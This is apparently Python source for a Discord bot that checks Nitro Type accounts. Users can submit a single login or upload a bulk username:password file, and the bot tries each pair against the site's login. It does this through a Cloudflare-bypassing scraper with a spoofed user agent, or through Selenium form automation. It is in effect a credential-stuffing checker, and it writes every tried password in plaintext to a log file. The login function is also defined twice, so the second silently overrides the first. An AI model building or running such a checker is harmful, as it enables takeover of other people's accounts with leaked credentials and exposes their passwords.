import os
import discord
import cloudscraper as requests
import json
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from discord.ext import commands
from discord import app_commands

def log_account_details(username, password, success, message):
    log_message = f"Username: {username}, Password: {password}, Success: {success}, Message: {message}\n"

    with open("account_log.txt", "a") as log_file:
        log_file.write(log_message)

    print(log_message)

def login_to_nitro_type(username, password):
    login_url = "https://www.nitrotype.com/api/v2/auth/login/username"
    with requests.create_scraper(disableCloudflareV1=True, browser={'custom':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'}) as session:
        session.headers['x-username'] = username
        session.headers['referer'] = 'https://www.nitrotype.com/login'
        session.headers['origin'] = 'https://www.nitrotype.com/'
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'

        login_data = {
            'username': username,
            'password': password
        }

        response = session.post(login_url, data=login_data)
        
        if response.status_code == 200:
            message = f"Successful Login for Username: {username}!"
            success = True
        else:
            message = f"Failed Login: (Username: {username})"
            success = False
        log_account_details(username, password, success, message)
        
        return success, message

async def info(interaction, file_path):
    credentials = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                try:
                    username, password = line.strip().split(':')
                    credentials.append((username, password))
                except ValueError:
                    raise ValueError(f"Invalid format in line:'{line.strip()}'. Each line must be in the 'username:password' format.")
        if not credentials:
            raise ValueError("No valid information were found in the file.")
        return credentials
    except Exception as e:
        error_message = f"Error reading file: {e}"
        try:
            await interaction.user.send(error_message)
            await interaction.followup.send(error_message)
        except discord.Forbidden:
            await interaction.response.send_message(f"Unable to send error message to your DM. Please check your privacy settings.", ephemeral=True)
        raise ValueError(error_message)

bot = commands.Bot(command_prefix='/', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}!")
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="Nitro Type"))
    try:
        synced = await bot.tree.sync()
        print(f"Slash commands synced: {len(synced)}")
    except Exception as e:
        print(f"Error syncing commands: {e}")

@bot.tree.command(name="check", description="Check a single Nitro Type account information.")
@app_commands.describe(username="Account Username", password="Account Password")
async def check_account(interaction: discord.Interaction, username: str, password: str):
    if interaction.guild is None:
        await interaction.response.send_message("Sorry, commands cannot be used in DMs.", ephemeral=True)
        return

    success, message = login_to_nitro_type(username, password)

    try:
        await interaction.user.send(message)
        await interaction.response.send_message(f"The result has been sent to your DM, {interaction.user.mention}!", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("Unable to send DM. Please check your privacy settings.", ephemeral=True)

@bot.tree.command(name="check_bulk", description="Upload a file with Nitro Type account information to check.")
async def check_accounts(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer()

    file_path = f"credentials_{interaction.user.id}.txt"
    await file.save(file_path)

    try:
        credentials = await info(interaction, file_path)
        results = []
        for username, password in credentials:
            success, message = login_to_nitro_type(username, password)
            results.append(message)

        results_str = "\n".join(results)
        try:
            await interaction.user.send(f"Results:\n{results_str}")
            await interaction.followup.send("Results sent to your DM!")
        except discord.Forbidden:
            await interaction.followup.send("Unable to send DM. Please check your privacy settings.")
    except ValueError as e:
        pass
    finally:
        os.remove(file_path)

def login_to_nitro_type(username, password):
    try:
        service = Service(r"C:\Users\madha\OneDrive\Documents\Visual Studio Code\Start\chromedriver.exe")
        driver = webdriver.Chrome(service=service)

        driver.get("https://www.nitrotype.com/login")
        time.sleep(2)

        username_field = driver.find_element(By.ID, "username")
        password_field = driver.find_element(By.ID, "password")

        username_field.send_keys(username)
        password_field.send_keys(password)

        password_field.send_keys(Keys.RETURN)
        time.sleep(5)

        current_url = driver.current_url
        driver.quit()

        if "garage" in current_url:
            return True, "Login successful!"
        else:
            return False, "Login failed due to captcha or invalid information!"
    except Exception as e:
        return False, f"An error occurred: {e}"

@bot.tree.command(name="login", description="Log in to your Nitro Type account.")
@app_commands.describe(username="Nitro Type username", password="Nitro Type password")
async def login_command(interaction: discord.Interaction, username: str, password: str):
    await interaction.response.defer(ephemeral=True)

    success, message = login_to_nitro_type(username, password)

    if success:
        await interaction.followup.send(f"✅ {message}")
    else:
        await interaction.followup.send(f"❌ {message}")